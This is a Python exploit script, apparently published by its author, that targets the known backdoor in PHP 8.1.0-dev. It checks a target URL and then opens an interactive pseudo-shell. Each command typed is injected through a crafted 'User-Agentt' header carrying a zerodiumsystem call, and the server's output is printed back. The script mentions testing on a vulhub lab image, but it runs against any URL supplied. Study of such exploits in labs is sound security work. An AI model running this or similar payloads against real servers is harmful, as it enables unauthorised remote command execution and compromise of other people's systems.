#!/usr/bin/env python3

from termcolor import colored
from sys import argv, exit
import requests


# Date : 09 september 2022
#
# Exploit author : NullBrunk
# Developped on : Fedora 36
# Tested on : https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/
#
# Affected version : PHP 8.1.0-dev
# Exploit type : backdoor command execution
#
# Github : https://github.com/NullBrunk


def error(message: str):
    print(
        colored("[", "white", attrs=['bold']) +
        colored("!", 'red', attrs=['bold']) +
        colored("] ", "white", attrs=['bold']) +
        colored(message, "white", attrs=['bold'])
    )

def info(message: str):
    print(
        colored("[", "white", attrs=['bold']) +
        colored("*", 'yellow', attrs=['bold']) +
        colored("] ", "white", attrs=['bold']) +
        colored(message, "white", attrs=['bold'])
    )

def success(message: str):
    print(
        colored("[", "white", attrs=['bold']) +
        colored("+", 'cyan', attrs=['bold']) +
        colored("] ", "white", attrs=['bold']) +
        colored(message, "white", attrs=['bold'])
    )


def parseurl(url):
    if not url.startswith("http"):

        # requests.get need the schemas so let's add it
        error("No schemas specified ( http:// | https:// )")
        info("Using default one : http://")
        url = "http://" + url

        return url

    else:
        return url


class Exploit:

    def __init__(self, url):
        self.url = url


    def testurl(self):
        try:
            stc = requests.get(self.url).status_code

        except requests.exceptions.ConnectionError:
            return False

        if stc == 200:
            return True


    def parse_html(self, text):
        text = text.split("START_PARSE_HERE")[1]
        text = text.split("END_PARSE_HERE")[0]

        return text

    def help():
        success("Usage : python3 <target_url>")
        info("Example : python3 exploit.py https://example.com")


    def exploit(self):

        if self.testurl():

                success("Trying to pop a pseudo shell...")

                itb = True
                while itb is True:
                    try:
                        to_exec = input("$ ")

                        if to_exec in ["exit", "quit"]:
                            itb = False

                        exp = requests.get(
                            self.url,
                            headers = {
                                "User-Agentt": f"""zerodiumsystem("echo START_PARSE_HERE; {to_exec}; echo END_PARSE_HERE");"""
                            },

                            allow_redirects = False,
                        )
                        print(self.parse_html(exp.text))

                    except KeyboardInterrupt:
                        info("\nExiting ...")
                        itb = False

        else:
            error("Target seems to be down, aborting ... ")
            exit()


def main():
    if len(argv) == 1:
        error("Missing argument : <target_url>")
        info("Usage : python3 exploit.py -h")
        return 0

    elif argv[1] in ["-h", "--help"]:
        Exploit.help()

    elif len(argv) > 1:
        e = Exploit(parseurl(argv[1]))
        e.exploit()


if __name__ == "__main__":
    main()
